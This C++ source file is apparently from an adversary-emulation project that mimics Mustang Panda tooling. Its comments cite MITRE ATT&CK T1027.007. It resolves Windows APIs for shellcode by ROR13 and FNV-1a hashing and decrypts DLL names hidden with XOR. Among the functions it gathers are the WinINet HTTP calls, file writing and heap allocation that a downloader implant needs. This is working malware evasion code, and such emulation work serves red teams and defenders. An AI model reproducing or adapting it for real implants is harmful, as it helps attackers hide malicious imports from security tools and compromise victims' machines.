#include "shellcode_util.hpp"
#include <al/import.hpp>
#include "fnv1a.hpp"

/*
 * FetchFunctions:
 *      About:
 *          Dynamically resolves Windows API functions for use throughout shellcode.
 *          Uses the FNV-1A hash algorithm to compare API names.
 *      MITRE ATT&CK Techniques:
 *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
 *      CTI:
 *          https://www.welivesecurity.com/2022/03/23/mustang-panda-hodur-old-tricks-new-korplug-variant/
 *          https://www.proofpoint.com/us/blog/threat-insight/good-bad-and-web-bug-ta416-increases-operational-tempo-against-european
 */
DWORD FetchFunctions(func_pointers* fp) {
    auto kernel32 = GM(L"KERNEL32.DLL", by_ror13);
    if (!kernel32) {
        return FAIL_GET_KERNEL32;
    }

    auto ntdll = GM(L"NTDLL.DLL", by_ror13);
    if (!ntdll) {
        return FAIL_GET_NTDLL;
    }

    auto llw = GP(kernel32, LoadLibraryW, by_fnv1a);
    if (!llw) {
        return FAIL_GET_LOADLIBRARYW;
    }

    auto bcrypt = llw(L"bcrypt.dll"_xor);
    if (!bcrypt) {
        return FAIL_LOAD_BCRYPT;
    }

    HMODULE user32 = llw(L"user32.dll"_xor);
    if (!user32) {
        return FAIL_LOAD_USER32;
    }

    HMODULE wininet = llw(L"wininet.dll"_xor);
    if (!wininet) {
        return FAIL_LOAD_WININET;
    }

    HMODULE msvcrt = llw(L"msvcrt.dll"_xor);
    if (!msvcrt) {
        return FAIL_LOAD_MSVCRT;
    }

    fp->fp_sprintf = GP(msvcrt, sprintf, by_fnv1a);
    if (!(fp->fp_sprintf)) {
        return FAIL_GET_SPRINTF;
    }

    fp->fp_malloc = GP(msvcrt, malloc, by_fnv1a);
    if (!(fp->fp_malloc)) {
        return FAIL_GET_MALLOC;
    }

    fp->fp_realloc = GP(msvcrt, realloc, by_fnv1a);
    if (!(fp->fp_realloc)) {
        return FAIL_GET_REALLOC;
    }

    fp->fp_free = GP(msvcrt, free, by_fnv1a);
    if (!(fp->fp_free)) {
        return FAIL_GET_FREE;
    }

    fp->fp_InternetOpenA = GP(wininet, InternetOpenA, by_fnv1a);
    if (!(fp->fp_InternetOpenA)) {
        return FAIL_GET_INTERNETOPEN;
    }

    fp->fp_InternetConnectA = GP(wininet, InternetConnectA, by_fnv1a);
    if (!(fp->fp_InternetConnectA)) {
        return FAIL_GET_INTERNETCONNECTA;
    }

    fp->fp_InternetReadFile = GP(wininet, InternetReadFile, by_fnv1a);
    if (!(fp->fp_InternetReadFile)) {
        return FAIL_GET_INTERNETREADFILE;
    }

    fp->fp_InternetCloseHandle = GP(wininet, InternetCloseHandle, by_fnv1a);
    if (!(fp->fp_InternetCloseHandle)) {
        return FAIL_GET_INTERNETCLOSEHANDLE;
    }

    fp->fp_InternetQueryDataAvailable = GP(wininet, InternetQueryDataAvailable, by_fnv1a);
    if (!(fp->fp_InternetQueryDataAvailable)) {
        return FAIL_GET_INTERNETQUERYDATAAVAILABLE;
    }

    fp->fp_InternetSetOptionA = GP(wininet, InternetSetOptionA, by_fnv1a);
    if (!(fp->fp_InternetSetOptionA)) {
        return FAIL_GET_INTERNETSETOPTIONA;
    }

    fp->fp_InternetQueryOptionA = GP(wininet, InternetQueryOptionA, by_fnv1a);
    if (!(fp->fp_InternetQueryOptionA)) {
        return FAIL_GET_INTERNETQUERYOPTIONA;
    }

    fp->fp_HttpOpenRequestA = GP(wininet, HttpOpenRequestA, by_fnv1a);
    if (!(fp->fp_HttpOpenRequestA)) {
        return FAIL_GET_HTTPOPENREQUESTA;
    }

    fp->fp_HttpSendRequestA = GP(wininet, HttpSendRequestA, by_fnv1a);
    if (!(fp->fp_HttpSendRequestA)) {
        return FAIL_GET_HTTPSENDREQUESTA;
    }

    fp->fp_HttpQueryInfoW = GP(wininet, HttpQueryInfoW, by_fnv1a);
    if (!(fp->fp_HttpQueryInfoW)) {
        return FAIL_GET_HTTPQUERYINFOW;
    }

    fp->fp_Sleep = GP(kernel32, Sleep, by_fnv1a);
    if (!(fp->fp_Sleep)) {
        return FAIL_GET_SLEEP;
    }

    fp->fp_MessageBoxA = GP(user32, MessageBoxA, by_fnv1a);
    if (!(fp->fp_MessageBoxA)) {
        return FAIL_GET_MESSAGEBOXA;
    }

    // kernel32.HeapAlloc is forwarded to ntdll.RtlAllocateHeap
    fp->shared_fp.fp_HeapAlloc = GP(ntdll, RtlAllocateHeap, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapAlloc)) {
        return FAIL_GET_HEAPALLOC;
    }

    fp->shared_fp.fp_HeapCreate = GP(kernel32, HeapCreate, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapCreate)) {
        return FAIL_GET_HEAPCREATE;
    }

    fp->shared_fp.fp_HeapDestroy = GP(kernel32, HeapDestroy, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapDestroy)) {
        return FAIL_GET_HEAPDESTROY;
    }

    fp->shared_fp.fp_HeapFree = GP(kernel32, HeapFree, by_fnv1a);
    if (!(fp->shared_fp.fp_HeapFree)) {
        return FAIL_GET_HEAPFREE;
    }

    fp->shared_fp.fp_GetLastError = GP(kernel32, GetLastError, by_fnv1a);
    if (!(fp->shared_fp.fp_GetLastError)) {
        return FAIL_GET_GETLASTERROR;
    }

    fp->shared_fp.fp_CreateFileW = GP(kernel32, CreateFileW, by_fnv1a);
    if (!(fp->shared_fp.fp_CreateFileW)) {
        return FAIL_GET_CREATEFILEW;
    }

    fp->shared_fp.fp_CloseHandle = GP(kernel32, CloseHandle, by_fnv1a);
    if (!(fp->shared_fp.fp_CloseHandle)) {
        return FAIL_GET_CLOSEHANDLE;
    }

    fp->shared_fp.fp_vsnprintf = GP(ntdll, _vsnprintf, by_fnv1a);
    if (!(fp->shared_fp.fp_vsnprintf)) {
        return FAIL_GET_VSNPRINTF;
    }

    fp->shared_fp.fp_snprintf = GP(ntdll, _snprintf, by_fnv1a);
    if (!(fp->shared_fp.fp_snprintf)) {
        return FAIL_GET_SNPRINTF;
    }

    fp->shared_fp.fp_GetSystemTime = GP(kernel32, GetSystemTime, by_fnv1a);
    if (!(fp->shared_fp.fp_GetSystemTime)) {
        return FAIL_GET_GETSYSTEMTIME;
    }

    fp->shared_fp.fp_SetFilePointer = GP(kernel32, SetFilePointer, by_fnv1a);
    if (!(fp->shared_fp.fp_SetFilePointer)) {
        return FAIL_GET_SETFILEPOINTER;
    }

    fp->shared_fp.fp_WriteFile = GP(kernel32, WriteFile, by_fnv1a);
    if (!(fp->shared_fp.fp_WriteFile)) {
        return FAIL_GET_WRITEFILE;
    }

    fp->shared_fp.fp_BCryptGenRandom = GP(bcrypt, BCryptGenRandom, by_fnv1a);
    if (!(fp->shared_fp.fp_BCryptGenRandom)) {
        return FAIL_GET_BCRYPTGENRANDOM;
    }

    return ERROR_SUCCESS;

}
